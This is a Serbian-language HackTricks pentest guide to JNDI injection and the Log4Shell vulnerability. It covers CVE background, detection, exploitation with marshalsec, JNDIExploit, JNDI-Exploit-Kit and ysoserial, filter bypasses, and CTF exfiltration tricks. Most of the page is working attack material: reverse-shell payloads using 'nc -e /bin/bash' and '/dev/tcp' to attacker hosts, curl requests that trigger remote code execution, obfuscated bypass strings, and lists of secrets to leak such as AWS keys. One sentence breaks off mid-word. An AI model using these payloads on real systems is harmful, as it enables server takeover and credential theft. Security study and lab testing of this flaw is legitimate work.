# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretnje, pronalazi probleme u celom vašem tehnološkom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Osnovne informacije

JNDI, integrisan u Javu od kasnih 1990-ih, služi kao direktorijumski servis koji omogućava Java programima da pronađu podatke ili objekte putem sistema za imenovanje. Podržava različite direktorijumske servise putem interfejsa pružaoca usluga (SPI), omogućavajući dobijanje podataka iz različitih sistema, uključujući udaljene Java objekte. Uobičajeni SPI-jevi uključuju CORBA COS, Java RMI Registry i LDAP.

### JNDI Imenovanje Reference
Java objekti mogu biti smešteni i dobijeni korišćenjem JNDI Imenovanih Referenci, koje dolaze u dva oblika:

- **Reference Adrese**: Specificira lokaciju objekta (npr. _rmi://server/ref_), omogućavajući direktno dobijanje sa navedene adrese.
- **Udaljeni Fabrika**: Referenca na udaljenu fabričku klasu. Kada se pristupi, klasa se preuzima i instancira sa udaljene lokacije.

Međutim, ovaj mehanizam može biti iskorišćen, što potencijalno dovodi do učitavanja i izvršavanja proizvoljnog koda. Kao protivmera:

- **RMI**: `java.rmi.server.useCodeabseOnly = true` podrazumevano od JDK 7u21, ograničava udaljeno učitavanje objekata. Bezbednosni menadžer dalje ograničava šta može biti učitano.
- **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` podrazumevano od JDK 6u141, 7u131, 8u121, blokira izvršavanje udaljeno učitanih Java objekata. Ako je postavljeno na `true`, izvršavanje udaljenog koda je moguće bez nadzora bezbednosnog menadžera.
- **CORBA**: Nema specifično svojstvo, ali bezbednosni menadžer je uvek aktivan.

Međutim, **Naming Manager**, odgovoran za rešavanje JNDI linkova, nema ugrađene mehanizme bezbednosti, što potencijalno omogućava dobijanje objekata iz bilo kog izvora. Ovo predstavlja rizik jer se RMI, LDAP i CORBA zaštite mogu zaobići, što dovodi do učitavanja proizvoljnih Java objekata ili iskorišćavanja postojećih komponenti aplikacije (gadžeta) za pokretanje zlonamernog koda.

Primeri iskorišćivih URL-ova uključuju:
- _rmi://napadački-server/bar_
- _ldap://napadački-server/bar_
- _iiop://napadački-server/bar_

Uprkos zaštitama, ranjivosti ostaju, uglavnom zbog nedostatka zaštite od učitavanja JNDI iz nepouzdanih izvora i mogućnosti zaobilaženja postojećih zaštita.


### JNDI Primer

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Čak i ako ste postavili **`PROVIDER_URL`**, možete navesti drugu vrednost u pretrazi i ona će biti korišćena: `ctx.lookup("<url-kontrolisan-od-strane-napadača>")` i to je ono što će napadač iskoristiti da učita proizvoljne objekte sa sistema koji je pod njegovom kontrolom.

### Pregled CORBA

CORBA (Common Object Request Broker Architecture) koristi **Interoperabilnu Referencu na Objekat (IOR)** da jedinstveno identifikuje udaljene objekte. Ova referenca uključuje osnovne informacije kao što su:

- **ID Tipa**: Jedinstveni identifikator za interfejs.
- **Codebase**: URL za dobijanje klase stuba.

Važno je napomenuti da CORBA nije inherentno ranjiv. Osiguravanje bezbednosti obično uključuje:

- Instalacija **Bezbednosnog Menadžera**.
- Konfigurisanje Bezbednosnog Menadžera da dozvoli konekcije ka potencijalno zlonamernim codebase-ovima. Ovo se može postići putem:
- Dozvola za sokete, npr. ````permissions java.net.SocketPermission "*:1098-1099", "connect";````.
- Dozvole za čitanje fajlova, ili univerzalno (````permission java.io.FilePermission "<<ALL FILES>>", "read";````) ili za specifične direktorijume gde se mogu nalaziti zlonamerne datoteke.

Međutim, neka pravila proizvođača mogu biti popustljiva i dozvoljavati ove konekcije podrazumevano.

### RMI Kontekst

Za RMI (Remote Method Invocation), situacija je donekle drugačija. Kao i kod CORBA-e, preuzimanje proizvoljnih klasa je podrazumevano ograničeno. Da bi se iskoristio RMI, obično bi bilo potrebno zaobići Bezbednosnog Menadžera, što je takođe relevantno i kod CORBA-e.

### LDAP

Prvo, treba razlikovati između Pretrage i Pretrage po imenu.\
**Pretraga** će koristiti URL poput `ldap://localhost:389/o=JNDITutorial` da pronađe objekat JNDITutorial sa LDAP servera i **dobije njegove atribute**.\
**Pretraga po imenu** je namenjena **imenovanim uslugama** jer želimo da dobijemo **šta god je vezano za ime**.

Ako je LDAP pretraga pozvana sa **SearchControls.setReturningObjFlag() sa `true`, tada će vraćeni objekat biti rekonstruisan**.

Stoga, postoji nekoliko načina za napad na ove opcije.\
Napadač može otrovati LDAP zapise unoseći u njih payload-ove koji će se izvršiti u sistemima koji ih prikupljaju (vrlo korisno za **kompromitovanje desetina mašina** ako imate pristup LDAP serveru). Drugi način za iskorišćavanje ovoga je izvođenje **MitM napada u LDAP pretrazi** na primer.

U slučaju da možete **naterati aplikaciju da rešava JNDI LDAP URL**, možete kontrolisati LDAP koji će biti pretražen, i možete poslati naz
## Log4Shell Vulnerabilnost

Ranjivost je uvedena u Log4j jer podržava [**posebnu sintaksu**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) u obliku `${prefix:name}` gde je `prefix` jedan od različitih [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) gde se `name` treba evaluirati. Na primer, `${java:version}` je trenutna verzija Java-e koja se izvršava.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) je uveo mogućnost pretrage `jndi`. Ova mogućnost omogućava dobijanje promenljivih putem JNDI. Obično se ključ automatski prefiksira sa `java:comp/env/`. Međutim, ako sam ključ sadrži **":"**, ovaj podrazumevani prefiks se ne primenjuje.

Sa **: prisutnim** u ključu, kao u `${jndi:ldap://example.com/a}`, nema prefiksa i **LDAP server se upita za objekat**. I ovi Lookups mogu se koristiti kako u konfiguraciji Log4j-a, tako i prilikom logovanja linija.

Stoga, jedino što je potrebno da se dobije RCE je **ranjiva verzija Log4j-a koja obrađuje informacije koje kontroliše korisnik**. I zato što je ova biblioteka široko korišćena u Java aplikacijama za logovanje informacija (uključujući aplikacije koje su dostupne na internetu), bilo je vrlo uobičajeno da log4j loguje, na primer, primljene HTTP zaglavlja kao što je User-Agent. Međutim, log4j se **ne koristi samo za logovanje HTTP informacija, već i za bilo koji unos** i podatke koje je programer naznačio.

## Pregled CVE-ova povezanih sa Log4Shell-om

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **[Kritično]**
Ova ranjivost je kritična **nesigurna deserializacijska greška** u komponenti `log4j-core`, koja utiče na verzije od 2.0-beta9 do 2.14.1. Omogućava **izvršavanje udaljenog koda (RCE)**, što omogućava napadačima da preuzmu kontrolu nad sistemima. Problem je prijavio Chen Zhaojun iz Alibaba Cloud Security tima i utiče na razne Apache okvire. Početni popravak u verziji 2.15.0 bio je nepotpun. Sigma pravila za odbranu su dostupna ([Pravilo 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Pravilo 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **[Kritično]**
Početno ocenjen kao nizak, ali kasnije je prekvalifikovan kao kritičan, ovaj CVE je greška **odbijanja usluge (DoS)** koja proizlazi iz nepotpunog popravka u verziji 2.15.0 za CVE-2021-44228. Utiče na nezadate konfiguracije, omogućavajući napadačima da izazovu DoS napade putem posebno oblikovanih payloada. Jedan [tvit](https://twitter.com/marcioalm/status/1471740771581652995) prikazuje metodu zaobilaženja. Problem je rešen u verzijama 2.16.0 i 2.12.2 uklanjanjem šablona pretrage poruka i onemogućavanjem JNDI po podrazumevanim podešavanjima.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **[Visok]**
Uticaj na **Log4j 1.x verzije** u nezadatim konfiguracijama koje koriste `JMSAppender`, ovaj CVE je nesigurna deserializacijska greška. Nema dostupnog popravka za granu 1.x, koja je završena, i preporučuje se nadogradnja na `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **[Umjereno]**
Ova ranjivost utiče na **Logback logging framework**, naslednika Log4j 1.x. Prethodno se smatralo da je okvir siguran, ali utvrđeno je da je ranjiv, i objavljene su nove verzije (1.3.0-alpha11 i 1.2.9) kako bi se rešio problem.

### **CVE-2021-45105** **[Visok]**
Log4j 2.16.0 sadrži grešku DoS, što je dovelo do izdanja `log4j 2.17.0` kako bi se popravio CVE. Dodatne detalje možete pronaći u izveštaju BleepingComputer-a ([izveštaj](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/)).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
Uticaj na log4j verziju 2.17, ovaj CVE zahteva da napadač kontroliše konfiguracionu datoteku log4j-a. Uključuje potencijalno izvršavanje proizvoljnog koda putem konfigurisanog JDBCAppender-a. Više detalja možete pronaći u [Checkmarx blog postu](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).


## Eksploatacija Log4Shell-a

### Otkrivanje

Ova ranjivost je vrlo lako otkriti ako nije zaštićena, jer će poslati barem **DNS zahtev** na adresu koju ste naveli u svom payloadu. Stoga, payloadi poput:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (koristeći [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (koristeći [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (koristeći Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (koristeći [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (koristeći [huntress](https://log4shell.huntress.com))

Imajte na umu da **čak i ako se primi DNS zahtev, to ne znači da je aplikacija iskoristiva** (ili čak ranjiva), moraćete pokušati da je iskoristite.

{% hint style="info" %}
Za **eksploataciju verzije 2.15** trebate dodati **bypass proveru lokalnog računara**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Lokalno otkrivanje**

Pretražite **lokalne ranjive verzije** biblioteke sa:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifikacija**

Neki od prethodno navedenih platformi će vam omogućiti da unesete neke promenljive podatke koji će biti zabeleženi prilikom zahteva.\
Ovo može biti veoma korisno za 2 stvari:

* Da **verifikujete** ranjivost
* Da **eksfiltrirate informacije** zloupotrebom ranjivosti

Na primer, možete zahtevati nešto kao:\
ili kao `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** i ako se **primi DNS zahtev sa vrednošću env promenljive**, znate da je aplikacija ranjiva.

Drugi podaci koje možete pokušati **procuriti**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Informacije

{% hint style="info" %}
Hostovi koji koriste JDK verzije iznad 6u141, 7u131 ili 8u121 su zaštićeni od napada putem LDAP klasnog učitavanja. Ovo je zbog podrazumevanog deaktiviranja `com.sun.jndi.ldap.object.trustURLCodebase`, što sprečava JNDI da učita udaljeni kod putem LDAP-a. Međutim, važno je napomenuti da ove verzije **nisu zaštićene od napada putem deserializacije**.

Za napadače koji žele da iskoriste ove više verzije JDK-a, neophodno je koristiti **pouzdanu napravu** unutar Java aplikacije. Alati poput ysoserial ili JNDIExploit se često koriste u tu svrhu. S druge strane, iskorišćavanje nižih verzija JDK-a je relativno lakše jer se ove verzije mogu manipulisati da učitaju i izvrše proizvoljne klase.

Za **više informacija** (_kao što su ograničenja na RMI i CORBA vektore_) **proverite prethodni odeljak JNDI Naming Reference** ili [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec sa prilagođenim payloadom

Možete testirati ovo na **THM box-u:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Koristite alat [**marshalsec**](https://github.com/mbechler/marshalsec) (verzija jar dostupna [**ovde**](https://github.com/RandomRobbieBF/marshalsec-jar)). Ovaj pristup uspostavlja LDAP referal server koji preusmerava konekcije ka sekundarnom HTTP serveru gde će biti smešten eksploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Da biste naveli cilj da učita kod za obrnutu ljusku, kreirajte Java datoteku nazvanu `Exploit.java` sa sledećim sadržajem:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Kompajlirajte Java fajl u klasni fajl koristeći: `javac Exploit.java -source 8 -target 8`. Zatim, pokrenite **HTTP server** u direktorijumu koji sadrži klasni fajl koristeći: `python3 -m http.server`. Proverite da **marshalsec LDAP server** referiše na ovaj HTTP server.

Pokrenite izvršavanje klase exploit na podložnom veb serveru slanjem payloada koji izgleda ovako:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Napomena:** Ova eksploatacija se oslanja na konfiguraciju Java-e koja omogućava udaljeno učitavanje koda putem LDAP-a. Ako ovo nije dozvoljeno, razmotrite eksploataciju pouzdane klase za izvršavanje proizvoljnog koda.


### RCE - **JNDIExploit**

{% hint style="info" %}
Napomena da je autor iz nekog razloga uklonio ovaj projekat sa github-a nakon otkrića log4shell-a. Možete pronaći keširanu verziju na [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), ali ako želite poštovati odluku autora, koristite drugu metodu za eksploataciju ove ranjivosti.

Takođe, ne možete pronaći izvorni kod na wayback machine-u, pa ili analizirajte izvorni kod ili izvršite jar znajući da ne znate šta izvršavate.
{% endhint %}

Za ovaj primer možete pokrenuti ovaj **ranjivi veb server za log4shell** na portu 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_u README-u ćete pronaći kako ga pokrenuti_). Ova ranjiva aplikacija beleži sadržaj zaglavlja HTTP zahteva _X-Api-Version_ pomoću ranjive verzije log4shell-a.

Zatim, možete preuzeti jar datoteku **JNDIExploit** i izvršiti je pomoću:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Nakon što pročitate kod samo nekoliko minuta, u _com.feihong.ldap.LdapServer_ i _com.feihong.ldap.HTTPServer_ možete videti kako se **kreiraju LDAP i HTTP serveri**. LDAP server će razumeti koji payload treba poslužiti i preusmeriti žrtvu na HTTP server koji će izvršiti eksploataciju.\
U _com.feihong.ldap.gadgets_ možete pronaći **neke specifične gadgete** koji se mogu koristiti za izvršenje željene radnje (potencijalno izvršavanje proizvoljnog koda). A u _com.feihong.ldap.template_ možete videti različite klase predložaka koje će **generisati eksploate**.

Možete videti sve dostupne eksploate pomoću **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Neki korisni su:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Dakle, u našem primeru već imamo pokrenutu ranjivu Docker aplikaciju. Da je napadnemo:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Kada šaljete napade, videćete izlaz u terminalu gde ste izvršili **JNDIExploit-1.2-SNAPSHOT.jar**.

**Ne zaboravite da proverite `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` za druge opcije iskorišćavanja. Takođe, ukoliko vam je potrebno, možete promeniti portove LDAP i HTTP servera.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Na sličan način kao i prethodni napad, možete pokušati da koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da iskoristite ovu ranjivost.\
Možete generisati URL-ove koje ćete poslati žrtvi pokretanjem:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Ovaj napad koristeći prilagođeni generisani Java objekat će raditi u laboratorijama poput **THM solarne sobe**. Međutim, ovo obično neće raditi (jer Java po defaultu nije konfigurisana da učitava udaljene codebase-ove koristeći LDAP) mislim da zato što ne zloupotrebljava pouzdanu klasu da izvrši proizvoljni kod._

### RCE - ysoserial & JNDI-Exploit-Kit

Ova opcija je veoma korisna za napade na **Java verzije konfigurisane da veruju samo određenim klasama, a ne svima**. Stoga će se koristiti **ysoserial** za generisanje **serijalizacija pouzdanih klasa** koje se mogu koristiti kao gedžeti za **izvršavanje proizvoljnog koda** (_pouzdana klasa zloupotrebljena od strane ysoserial-a mora biti korišćena od strane Java programa žrtve da bi eksploit radio_).

Korišćenjem **ysoserial**-a ili [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) možete kreirati deserializacijski eksploit koji će biti preuzet putem JNDI-ja:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da biste generisali **JNDI linkove** gde će eksploit čekati konekcije od ranjivih mašina. Možete poslužiti **različite eksploite koji se mogu automatski generisati** pomoću JNDI-Exploit-Kit-a ili čak **sopstvene deserializacijske payloade** (generisane od strane vas ili ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Sada možete lako koristiti generisanu JNDI vezu da iskoristite ranjivost i dobijete **obrnuti shell** tako što ćete poslati ranjivoj verziji log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypassovi
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### Automatski skeneri

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Pronađi lokalne ranjive biblioteke

### Laboratorije za testiranje

* [**LogForge HTB mašina**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar soba**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Eksploatacija nakon Log4Shell

U ovom [**CTF writeup-u**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) je dobro objašnjeno kako je potencijalno **moguće iskoristiti** neke funkcionalnosti **Log4J**-a.

[**Stranica sa bezbednošću**](https://logging.apache.org/log4j/2.x/security.html) Log4j-a ima nekoliko interesantnih rečenica:

> Od verzije 2.16.0 (za Java 8), **funkcionalnost pretrage poruka je potpuno uklonjena**. **Pretrage u konfiguraciji i dalje rade**. Osim toga, Log4j sada podrazumevano onemogućava pristup JNDI-ju. Pretrage JNDI-ja u konfiguraciji sada moraju biti eksplicitno omogućene.

> Od verzije 2.17.0 (i 2.12.3 i 2.3.1 za Java 7 i Java 6), **samo se rekurzivno proširuju niske pretrage u konfiguraciji**; u bilo kojoj drugoj upotrebi, samo se vrši razrešavanje najvišeg nivoa pretrage, a bilo koje ugnežđene pretrage se ne razrešavaju.

To znači da podrazumevano ne možete **koristiti bilo koji `jndi` eksploit**. Osim toga, da biste izvršili **rekurzivne pretrage**, morate ih imati konfigurisane.

Na primer, u tom CTF-u je to konfigurisano u datoteci log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Pretraga okruženja

U [ovom CTF-u](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) napadač je kontrolisao vrednost `${sys:cmd}` i trebao je da izvuče zastavicu iz okružne promenljive.\
Kao što je prikazano na ovoj stranici u [**prethodnim payloadima**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), postoje različiti načini za pristupanje okružnim promenljivama, kao što je **`${env:FLAG}`**. U ovom CTF-u to nije bilo korisno, ali može biti korisno u drugim stvarnim scenarijima.

### Izvlačenje u izuzecima

U CTF-u, niste mogli pristupiti stderr-u java aplikacije koristeći log4J, ali Log4J **izuzeci se šalju na stdout**, koji je bio prikazan u python aplikaciji. To znači da smo, pokretanjem izuzetka, mogli pristupiti sadržaju. Izuzetak za izvlačenje zastavice bio je: **`${java:${env:FLAG}}`.** Ovo funkcioniše zato što **`${java:CTF{blahblah}}`** ne postoji i biće prikazan izuzetak sa vrednošću zastavice:

![](<../../.gitbook/assets/image (157).png>)

### Izuzeci konverzije obrazaca

Samo da napomenem, mogli ste takođe ubaciti nove [**obrasce konverzije**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) i pokrenuti izuzetke koji će biti zabeleženi u `stdout`. Na primer:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Ovo nije bilo korisno za izvlačenje podataka unutar poruke o grešci, jer pretraga nije bila rešena pre obrasca konverzije, ali moglo bi biti korisno za druge stvari kao što je otkrivanje.

### Regexi obrazaca konverzije

Međutim, moguće je koristiti neke **obrasce konverzije koji podržavaju regexe** za izvlačenje informacija iz pretrage korišćenjem regexa i zloupotrebe **binarne pretrage** ili **pretrage zasnovane na vremenu**.

* **Binarne pretrage putem poruka izuzetaka**

Obrazac konverzije **`%replace`** može se koristiti za **zamenu** **sadržaja** iz **stringa** čak i koristeći **regexe**. Radi na sledeći način: `replace{pattern}{regex}{substitution}`\
Zloupotrebom ovog ponašanja mogli biste izazvati izuzetak ako se regex poklapa sa bilo čim unutar stringa (i nema izuzetka ako nije pronađeno) na sledeći način:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Vremenski bazirano**

Kao što je pomenuto u prethodnom odeljku, **`%replace`** podržava **regexe**. Dakle, moguće je koristiti payload sa [**ReDoS stranice**](../regular-expression-denial-of-service-redos.md) kako bi se izazvalo **zadržavanje** u slučaju pronalaska zastave.\
Na primer, payload poput `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` bi izazvao **zadržavanje** u tom CTF-u.

U ovom [**writeup-u**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), umesto korišćenja ReDoS napada, korišćen je **napad amplifikacije** kako bi se izazvala razlika u vremenu odgovora:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Ako zastava počinje sa `flagGuess`, cela zastava će biti zamenjena sa 29 `#`-a (koristio sam ovaj karakter jer verovatno neće biti deo zastave). **Svaki od rezultirajućih 29 `#`-a je zatim zamenjen sa 54 `#`-a**. Ovaj proces se ponavlja **6 puta**, što dovodi do ukupno ` 29*54*54^6* =`` `` `**`96816014208`  `#`-a!**
>
> Zamena toliko `#`-a će izazvati 10-sekundno zadržavanje Flask aplikacije, što će rezultirati slanjem HTTP status koda 500 korisniku. (Ako zastava ne počinje sa `flagGuess`, dobićemo status kod koji nije 500)

## Reference

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
